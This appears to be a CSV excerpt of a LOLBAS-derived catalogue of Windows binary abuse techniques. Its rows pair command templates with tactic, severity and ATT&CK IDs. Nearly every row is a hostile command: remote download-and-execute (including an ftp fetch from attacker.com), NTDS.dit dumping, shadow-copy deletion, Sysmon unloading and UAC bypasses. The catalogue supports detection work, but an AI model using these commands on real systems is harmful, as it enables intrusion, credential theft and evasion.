2131,Windows,"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{CMD}""} -r:http://target:5985",Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/winrm.vbs/
2132,Windows,"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/winrm.vbs/
2133,Windows,%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,"Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.",AWL Bypass,Medium,T1220,https://lolbas-project.github.io/lolbas/Binaries/winrm.vbs/
2134,Windows,"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",Proxy execute Managed DLL with PowerShell,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/UtilityFunctions.ps1/
2135,Windows,"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}","Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)",AWL Bypass,Medium,T1127.002,https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/
2136,Windows,Pcwrun.exe {PATH_ABSOLUTE:.exe},Open the target .EXE file with the Program Compatibility Wizard.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/
2137,Windows,Pcwrun.exe /../../$(calc).exe,Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/
2138,Windows,"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Forfiles/
2139,Windows,"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Forfiles/
2140,Windows,csc.exe -out:{PATH:.exe} {PATH:.cs},"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.",Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Csc/
2141,Windows,csc -target:library {PATH:.cs},"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.",Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Csc/
2142,Windows,fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},Zero out a file,Tamper,Medium,T1485,https://lolbas-project.github.io/lolbas/Binaries/Fsutil/
2143,Windows,fsutil.exe usn deletejournal /d c:,Delete the USN journal volume to hide file creation activity,Tamper,Medium,T1485,https://lolbas-project.github.io/lolbas/Binaries/Fsutil/
2144,Windows,fsutil.exe trace decode,Executes a pre-planted binary named netsh.exe from the current directory.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Fsutil/
2145,Windows,ieexec.exe {REMOTEURL:.exe},Downloads and executes executable from the remote server.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
2146,Windows,ieexec.exe {REMOTEURL:.exe},Downloads and executes executable from the remote server.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
2147,Windows,change.exe user,"Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, if `change.exe` is copied to a folder and an arbitrary executable is renamed to `chgusr.exe`, `change.exe` will spawn it. Instead of `user`, it is also possible to use `port` or `logon` as command-line option.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Change/
2148,Windows,"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",Executes binary that is pre-planted at C:\test\system32\netsh.exe.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/iediagcmd/
2149,Windows,colorcpl {PATH},Copies the referenced file to C:\Windows\System32\spool\drivers\color\.,Copy,Medium,T1036.005,https://lolbas-project.github.io/lolbas/Binaries/Colorcpl/
2150,Windows,Ldifde -i -f {PATH:.ldf},"Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.",Download,High,T1105,https://lolbas-project.github.io/lolbas/Binaries/Ldifde/
2151,Windows,mofcomp.exe {PATH_ABSOLUTE:.mof},Abuse of mofcomp.exe to parse a file which contains MOF statements in order create new classes as part of the WMI repository,Execute,Critical,T1047,https://lolbas-project.github.io/lolbas/Binaries/Mofcomp/
2152,Windows,SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},Execute file specified in %COMSPEC%,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/SettingSyncHost/
2153,Windows,SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/SettingSyncHost/
2154,Windows,ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},"Upload file, credentials or data exfiltration in general",Upload,Medium,T1567,https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
2155,Windows,ConfigSecurityPolicy.exe {REMOTEURL},It will download a remote payload and place it in INetCache.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
2156,Windows,"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet",Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx),Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/wbadmin/
2157,Windows,"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/wbadmin/
2158,Windows,PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},Create a ZIP file from a folder in a remote drive,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/
2159,Windows,PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/
2160,Windows,tttracer.exe {PATH_ABSOLUTE:.exe},Execute specified executable from tttracer.exe. Requires administrator privileges.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Tttracer/
2161,Windows,TTTracer.exe -dumpFull -attach {PID},Dumps process using tttracer.exe. Requires administrator privileges,Dump,High,T1003,https://lolbas-project.github.io/lolbas/Binaries/Tttracer/
2162,Windows,query.exe user,"Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if `query.exe` is copied to a folder and an arbitrary executable is renamed to `quser.exe`, `query.exe` will spawn it. Instead of `user`, it is also possible to use `session`, `termsession` or `process` as command-line option.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Query/
2163,Windows,rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.,Credentials,Critical,T1003,https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
2164,Windows,rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).,Credentials,Critical,T1187,https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
2165,Windows,"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",Creates a new service and executes the file stored in the ADS.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Sc/
2166,Windows,"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",Modifies an existing service and executes the file stored in the ADS.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Sc/
2167,Windows,odbcad32.exe,"Launch odbcad32.exe GUI, click 'Tracing' tab, click 'Browsing' button, enter abitrary command in the File Dialog's path, press enter.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/odbcad32/
2168,Windows,wab.exe,Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wab/
2169,Windows,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",Downloads the file and sets it as the computer's lockscreen,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/
2170,Windows,mmc.exe -Embedding {PATH_ABSOLUTE:.msc},Launch a 'backgrounded' MMC process and invoke a COM payload,Execute,Critical,T1218.014,https://lolbas-project.github.io/lolbas/Binaries/Mmc/
2171,Windows,mmc.exe gpedit.msc,Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.,UAC Bypass,Critical,T1218.014,https://lolbas-project.github.io/lolbas/Binaries/Mmc/
2172,Windows,mmc.exe -Embedding {PATH_ABSOLUTE:.msc},Download and save an executable to disk,Download,Medium,T1218.014,https://lolbas-project.github.io/lolbas/Binaries/Mmc/
2173,Windows,reset.exe session,"Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, if `reset.exe` is copied to a folder and an arbitrary executable is renamed to `rwinsta.exe`, `reset.exe` will spawn it.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Reset/
2174,Windows,c:\windows\syswow64\iscsicpl.exe,"c:\windows\syswow64\iscsicpl.exe has a DLL injection through `C:\Users\<username>\AppData\Local\Microsoft\WindowsApps\ISCSIEXE.dll`, resulting in UAC bypass.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/iscsicpl/
2175,Windows,iscsicpl.exe,"Both `c:\windows\system32\iscsicpl.exe` and `c:\windows\system64\iscsicpl.exe` have UAC bypass through launching iscicpl.exe, then navigating into the Configuration tab, clicking Report, then launching your custom command.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/iscsicpl/
2176,Windows,regini.exe {PATH}:hidden.ini,Write registry keys from data inside the Alternate data stream.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Regini/
2177,Windows,Gpscript /logon,Executes logon scripts configured in Group Policy.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Gpscript/
2178,Windows,Gpscript /startup,Executes startup scripts configured in Group Policy,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Gpscript/
2179,Windows,bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.",ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
2180,Windows,bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
2181,Windows,bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Command for copying cmd.exe to another folder,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
2182,Windows,bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,"One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
2183,Windows,msedge.exe {REMOTEURL:.exe.txt},"Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Msedge/
2184,Windows,"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",Edge will silently download the file. File extension should be .html and binaries should be encoded.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Msedge/
2185,Windows,"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/Msedge/
2186,Windows,certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},Loads the target DLL file,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/CertOC/
2187,Windows,certoc.exe -GetCACAPS {REMOTEURL:.ps1},Downloads text formatted files,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/CertOC/
2188,Windows,jsc.exe {PATH:.js},Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Jsc/
2189,Windows,jsc.exe /t:library {PATH:.js},Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.,Compile,High,T1127,https://lolbas-project.github.io/lolbas/Binaries/Jsc/
2190,Windows,"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",Example command on how inject Powershell code into the process,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/SyncAppvPublishingServer/
2191,Windows,extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe,Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
2192,Windows,extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},Copy the source file to the destination file and overwrite it.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
2193,Windows,extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},Command for copying file from one folder to another,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
2194,Windows,Runonce.exe /AlternateShellStartup,Executes a Run Once Task that has been configured in the registry.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Runonce/
2195,Windows,Register-cimprovider -path {PATH_ABSOLUTE:.dll},Load the target .DLL.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/
2196,Windows,wbemtest.exe,"Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources.",Execute,Critical,T1047,https://lolbas-project.github.io/lolbas/Binaries/wbemtest/
2197,Windows,ComputerDefaults.exe,"Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/
2198,Windows,ATBroker.exe /start malware,Start a registered Assistive Technology (AT).,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Atbroker/
2199,Windows,verclsid.exe /S /C {CLSID},Used to verify a COM object before it is instantiated by Windows Explorer,Execute,Critical,T1218.012,https://lolbas-project.github.io/lolbas/Binaries/Verclsid/
2200,Windows,Msconfig.exe -5,Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Msconfig/
2201,Windows,netsh.exe add helper {PATH_ABSOLUTE:.dll},"Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called",Execute,Critical,T1546.007,https://lolbas-project.github.io/lolbas/Binaries/Netsh/
2202,Windows,msoxmled.exe /verb open {REMOTEURL},Downloads payload from remote server using the Microsoft Office XML Editor.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/msoxmled/
2203,Windows,"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""","Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/
2204,Windows,"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/
2205,Windows,Extexport.exe {PATH_ABSOLUTE:folder} foo bar,"Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Extexport/
2206,Windows,"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",Execute a .EXE file stored as an Alternate Data Stream (ADS),ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2207,Windows,"wmic.exe process call create ""{CMD}""",Execute calc from wmic,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2208,Windows,"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",Execute evil.exe on the remote system.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2209,Windows,"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",Create a volume shadow copy of NTDS.dit that can be copied.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2210,Windows,"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",Executes JScript or VBScript embedded in the target remote XSL stylsheet.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2211,Windows,"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",Copy file from source to destination.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2212,Windows,"WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState",Executes WMIC to gather the existing Antivirus or EDR solution installed on the machine.,Execute,Critical,T1518.001,https://lolbas-project.github.io/lolbas/Binaries/Wmic/
2213,Windows,vssadmin delete shadows /all /quiet,Delete all volume shadow copies on the host without prompting,Tamper,High,T1490,https://lolbas-project.github.io/lolbas/Binaries/Vssadmin/
2214,Windows,control.exe {PATH_ABSOLUTE}:evil.dll,Execute evil.dll which is stored in an Alternate Data Stream (ADS).,ADS,Medium,T1218.002,https://lolbas-project.github.io/lolbas/Binaries/Control/
2215,Windows,control.exe {PATH_ABSOLUTE:.cpl},Execute .cpl file. A CPL is a DLL file with CPlApplet export function),Execute,Critical,T1218.002,https://lolbas-project.github.io/lolbas/Binaries/Control/
2216,Windows,Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/
2217,Windows,Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/
2218,Windows,"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
2219,Windows,"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
2220,Windows,"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
2221,Windows,"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
2222,Windows,cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Cscript/
2223,Windows,regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Export the target Registry key to the specified .REG file.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Regedit/
2224,Windows,regedit {PATH_ABSOLUTE}:regfile.reg,Import the target .REG file into the Registry.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Regedit/
2225,Windows,cmdkey /list,List cached credentials,Credentials,Critical,T1078,https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/
2226,Windows,WorkFolders,Execute `control.exe` in the current working directory,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/WorkFolders/
2227,Windows,start ms-appinstaller://?source={REMOTEURL:.exe},"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
2228,Windows,"rundll32.exe {PATH},EntryPoint","First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.",Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
2229,Windows,"rundll32.exe {PATH_SMB:.dll},EntryPoint",Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
2230,Windows,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
2231,Windows,"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
2232,Windows,rundll32.exe -sta {CLSID},Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
2233,Windows,echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,Executes the commands you put inside the text file.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Ftp/
2234,Windows,"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Download,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Ftp/
2235,Windows,C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL},"IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
2236,Windows,fltMC.exe unload SysmonDrv,Unloads a driver used by security agents,Tamper,High,T1562.001,https://lolbas-project.github.io/lolbas/Binaries/fltMC/
2237,Windows,winget.exe install --manifest {PATH:.yml},Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`,Execute,Critical,T1105,https://lolbas-project.github.io/lolbas/Binaries/winget/
2238,Windows,winget.exe install --accept-package-agreements -s msstore {name or ID},"Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use ""Sysinternals Suite"" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/winget/
2239,Windows,winget.exe install --accept-package-agreements -s msstore {name or ID},"Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use ""Sysinternals Suite"" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.",AWL Bypass,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/winget/
2240,Windows,MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},"Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
2241,Windows,"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe","Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
2242,Windows,MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,Download file to machine and store it in Alternate Data Stream,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
2243,Windows,setres.exe -w 800 -h 600,Sets the resolution and then launches 'choice' command from the working directory.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Setres/
2244,Windows,tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},Compress one or more files to an alternate data stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Tar/
2245,Windows,tar -xf {PATH}:ads,Decompress a compressed file from an alternate data stream (ADS).,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Tar/
2246,Windows,tar -xf {PATH_SMB:.tar},Extracts archive.tar from the remote (internal) host to the current host.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Tar/
2247,Windows,InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},Execute the target .NET DLL or EXE.,AWL Bypass,Medium,T1218.004,https://lolbas-project.github.io/lolbas/Binaries/Installutil/
2248,Windows,InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},Execute the target .NET DLL or EXE.,Execute,Critical,T1218.004,https://lolbas-project.github.io/lolbas/Binaries/Installutil/
2249,Windows,InstallUtil.exe {REMOTEURL},It will download a remote payload and place it in INetCache.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Installutil/
